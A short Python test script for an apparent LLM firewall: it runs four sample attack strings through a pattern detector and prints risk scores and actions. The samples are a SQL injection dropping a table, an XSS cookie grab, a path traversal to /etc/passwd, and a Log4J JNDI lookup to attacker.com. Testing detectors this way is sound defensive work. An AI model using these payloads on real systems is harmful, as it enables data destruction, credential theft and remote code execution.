#!/usr/bin/env python3
"""TEST ATTACK PATTERNS - SOFORT"""

import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from llm_firewall.detectors.attack_patterns import scan_attack_patterns
from llm_firewall.policy.risk_weights_v2_otb import decide_action_otb
from llm_firewall.preprocess.context import classify_context

attacks = [
    ("SQL", "' OR '1'='1'; DROP TABLE users--"),
    ("XSS", "javascript:alert(document.cookie)"),
    ("Path", "../../../etc/passwd"),
    ("Log4J", "${jndi:ldap://attacker.com/exploit}"),
]

print("=" * 70)
print("ATTACK PATTERN DETECTOR TEST")
print("=" * 70)

for category, payload in attacks:
    attack_hits = scan_attack_patterns(payload)
    ctx = classify_context(payload)
    action, risk, contrib = decide_action_otb(attack_hits, ctx, text=payload)

    print(f"\n{category}: {payload}")
    print(f"  Hits: {attack_hits}")
    print(f"  Risk: {risk:.3f}")
    print(f"  Action: {action}")

print("\n" + "=" * 70)
print("TESTING IF FIXED")
print("=" * 70)
